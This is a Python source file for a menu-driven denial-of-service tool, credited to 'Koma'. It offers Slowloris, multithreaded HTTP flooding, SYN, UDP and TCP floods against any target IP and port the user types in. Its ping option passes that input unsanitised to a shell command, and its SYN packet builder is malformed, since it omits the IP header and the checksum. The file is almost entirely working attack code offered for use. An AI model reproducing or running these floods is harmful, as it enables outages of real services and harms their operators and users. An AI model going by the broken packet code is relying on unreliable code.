import struct
import colorama
import socket
import os
import time
import threading
import random

from colorama import init
init()

def slow_loris(target, port, duration):
    sockets = []
    start_time = time.time()
    
    try:
        for _ in range(200):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sockets.append(sock)
            print(f"Connected to {target}:{port}")

        while time.time() - start_time < duration:
            for sock in sockets:
                try:
                    sock.send(b"GET / HTTP/1.1\r\n")
                    sock.send(f"Host: {target}\r\n".encode())
                    sock.send(b"Connection: keep-alive\r\n\r\n")
                except Exception as e:
                    print(f"Error sending data: {e}")
                    sockets.remove(sock)

    finally:
        for sock in sockets:
            sock.close()

def ip_ping(target):
    response = os.system(f"ping -c 4 {target}")
    if response == 0:
        print(f"{target} is reachable")
    else:
        print(f"{target} is not reachable")

def http_ddos(target, port, duration):
    def attack():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode(), (target, port))
                sock.close()
            except Exception as e:
                print(f"Error during attack: {e}")
                break

    threads = []
    for _ in range(100):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
    time.sleep(duration)
    for thread in threads:
        thread.join()

def syn_flood(target, port, duration):
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            source_port = random.randint(1024, 65535)
            packet = create_syn_packet(source_port, target, port)
            sock.sendto(packet, (target, 0))
            print(f"Sent SYN packet to {target}:{port} from port {source_port}")
            time.sleep(0.01)

    except Exception as e:
        print(f"Error during SYN flood: {e}")

def create_syn_packet(source_port, target_ip, target_port):
    seq = 0
    ack = 0
    offset_res = (5 << 4) + 0
    tcp_flags = 0x02
    window = socket.htons(5840) 
    tcp_header = struct.pack('!HHLLBBHHH', source_port, target_port, seq, ack, offset_res, tcp_flags, window, 0, 0)

    source_ip = socket.inet_aton('0.0.0.0')
    dest_ip = socket.inet_aton(target_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    pseudo_header = struct.pack('!4s4sBBH', source_ip, dest_ip, placeholder, protocol, tcp_length)
    packet = pseudo_header + tcp_header
    return packet

def tcp_flood(target, port, duration):
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(b"Flooding")
            sock.close()
            print(f"Sent TCP packet to {target}:{port}")
            time.sleep(0.01)

    except Exception as e:
        print(f"Error during TCP flood: {e}")

def udp_flood(target, port, duration):
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = random._urandom(1024)
            sock.sendto(packet, (target, port))
            print(f"Sent UDP packet to {target}:{port}")
            time.sleep(0.01)

    except Exception as e:
        print(f"Error during UDP flood: {e}")

def display_menu():
    print(colorama.Fore.CYAN + """
    >>=========================================================<<
    ||    ____           ____                                  ||
    ||   /_  _\  _   _  /_  _\   ____     _ ___   _ _____      ||
    ||   [J  L] J \ / F [J  L]  F __ J   J '__ ", J '_  _ `,   ||
    ||    |  |   \ ' /   |  |  | _____J  | |__|-J| |_||_| |    ||
    ||    F  J  .' . `.  F  J  F L___--. F L  `-'F L LJ J J    ||
    ||   J____LJ__/:\__LJ____LJ\______/FJ__L    J__L LJ J__L   ||
    ||   |____||__/ \__||____| J______F |__L    |__L LJ J__|   ||
    >>=========================================================<<""")
    
    input_box = """
    +---------------------+  +-------------------------+
    | Type A Number:      |  | 1. Slow Loris           |
    |---------------------|  | 2. IP Ping              |
    | Made By Koma        |  | 3. HTTP DDoS            |
    | I did use a little  |  | 4. SyN Flood            |
    | ai for design       |  | 5. UDP Flood            |
    |                     |  | 6. TCP Flood            |
    |                     |  | 7. More Soon            |
    +---------------------+  +-------------------------+
    """
    
    print(colorama.Fore.BLUE + input_box)

def main_menu():
    while True:
        display_menu()
        first_input = input(colorama.Fore.GREEN + "| ")

        if first_input in ['1', '2', '3', '4', '5', '6']:
            target = input(colorama.Fore.GREEN + "Enter target IP: ")
            port = int(input(colorama.Fore.GREEN + "Enter target port: "))
            duration = int(input(colorama.Fore.GREEN + "Enter duration (in seconds): "))

            if first_input == '1':
                slow_loris(target, port, duration)
            elif first_input == '2':
                ip_ping(target)
            elif first_input == '3':
                http_ddos(target, port, duration)
            elif first_input == '4':
                syn_flood(target, port, duration)
            elif first_input == '5':
                udp_flood(target, port, duration)
            elif first_input == '6':
                tcp_flood(target, port, duration)

            go_back = input(colorama.Fore.GREEN + "Do you want to go back to the menu? (y/n): ")
            if go_back.lower() != 'y':
                print("Exiting the program.")
                break
        else:
            print("Invalid input. Please select a valid option.")

main_menu()
